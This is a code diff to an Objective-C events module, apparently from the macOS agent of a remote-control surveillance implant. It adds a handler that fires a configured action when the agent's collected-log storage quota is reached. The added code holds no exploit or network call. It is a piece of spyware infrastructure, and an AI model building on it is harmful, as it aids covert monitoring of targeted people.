@@ -38,6 +38,7 @@
 
 #import "RCSMEvents.h"
 #import "RCSMTaskManager.h"
+#import "RCSMDiskQuota.h"
 
 #import "RCSMLogger.h"
 #import "RCSMDebug.h"
@@ -47,6 +48,7 @@
 // MAXCOMLEN	16		/* max command name remembered */ 
 #define SCREENSAVER_PROCESS @"ScreenSaverEngin"
 
+extern NSString *RCSMaxLogQuotaReached;
 
 static RCSMEvents *sharedEvents = nil;
 static NSMutableArray *connectionsDetected = nil;
@@ -1003,8 +1005,64 @@ NSLock *connectionLock;
   [outerPool release];
 }
 
+- (void)eventQuotaNotificationCallback:(NSNotification*)aNotify
+{
+  NSNumber *actionId = (NSNumber*)[aNotify object];
+
+  if (actionId && [actionId intValue] > -1)
+    {
+#ifdef DEBUG_EVENTS
+    infoLog(@"event quota triggering action %@", actionId);
+#endif
+      [[RCSMTaskManager sharedInstance] triggerAction: [actionId intValue]];
+    }
+}
+
 - (void)eventQuota: (NSDictionary *)configuration
 {
+  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
+
+#ifdef DEBUG_EVENTS
+  infoLog(@"event quota start");
+#endif
+
+  [configuration retain];
+  
+  // Setting parameter
+  [[RCSMDiskQuota sharedInstance] setEventQuotaParam:configuration 
+                                           andAction:[configuration objectForKey:@"actionID"]];
+                                  
+  // Start to handle quota notification
+  [[NSNotificationCenter defaultCenter] addObserver:self 
+                                           selector:@selector(eventQuotaNotificationCallback:) 
+                                               name:RCSMaxLogQuotaReached 
+                                             object:nil];
+  
+  while ([configuration objectForKey: @"status"] != EVENT_STOP
+         && [configuration objectForKey: @"status"] != EVENT_STOPPED)
+    {
+      usleep(500000);
+    }
+  
+  if ([[configuration objectForKey: @"status"] isEqualToString: EVENT_STOP])
+    {
+      [configuration setValue: EVENT_STOPPED forKey: @"status"];
+      [configuration release];
+      
+      // Stop to handle quota notification 
+      // and reset the event quota conf param
+      [[NSNotificationCenter defaultCenter] removeObserver:self 
+                                                      name:RCSMaxLogQuotaReached 
+                                                    object:nil];
+      
+      [[RCSMDiskQuota sharedInstance] resetEventQuotaParam];
+      
+#ifdef DEBUG_EVENTS
+      infoLog(@"event quota stopped");
+#endif
+    }
+  
+  [outerPool release];
   return;
 }
 
